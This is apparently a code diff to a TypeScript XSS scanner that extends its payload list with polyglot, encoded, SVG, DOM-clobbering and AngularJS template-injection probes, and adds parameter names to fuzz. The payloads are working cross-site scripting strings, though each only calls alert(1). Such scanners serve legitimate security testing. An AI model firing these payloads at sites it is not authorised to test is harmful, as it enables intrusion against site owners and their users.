@@ -23,11 +23,28 @@ export const XSS_PAYLOADS = [
   `<iframe srcdoc="<svg onload=alert(1)>"></iframe>`,
   `"><body onload=alert(1)>`,
   `<details open ontoggle=alert(1)>`,
+  // Polyglot — works in many contexts
+  `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e`,
+  // Unicode-encoded
+  `\u003cscript\u003ealert(1)\u003c/script\u003e`,
+  // HTML5 SVG
+  `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`,
+  // mXSS / DOM-clobbering
+  `<form id=test><input name=attributes>`,
+  // Encoded angle brackets
+  `%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
+  // Double-encoded
+  `%253Cscript%253Ealert(1)%253C%252Fscript%253E`,
+  // Template-literal break
+  `\`-alert(1)-\``,
+  // AngularJS-style template injection
+  `{{constructor.constructor('alert(1)')()}}`,
 ];
 
 export const DEFAULT_PARAMS = [
   "q", "search", "query", "s", "keyword", "name", "id", "ref", "redirect",
   "next", "lang", "callback", "page", "msg", "error",
+  "title", "comment", "body", "content", "url", "return", "from", "to",
 ];
 
 async function safeFetch(
